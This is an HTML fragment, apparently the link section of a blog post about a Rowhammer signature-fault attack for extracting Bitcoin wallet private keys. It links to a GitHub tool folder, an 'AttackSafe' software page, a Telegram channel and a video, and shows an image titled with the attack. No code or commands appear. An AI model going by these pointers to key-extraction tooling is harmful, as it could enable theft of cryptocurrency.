<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/15RowhammerAttack" target="_blank" rel="noreferrer noopener">Source</a></strong></p>



<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">ATTACKSAFE SOFTWARE</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><a href="https://youtu.be/lfYPcXPzLjE" target="_blank" rel="noreferrer noopener"><strong>Video: https://youtu.be/lfYPcXPzLjE</strong></a></p>



<p><strong><a href="https://cryptodeeptech.ru/rowhammer-attack" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/rowhammer-attack</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/019-1-1024x576.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1122"></figure></div>


<p></p>
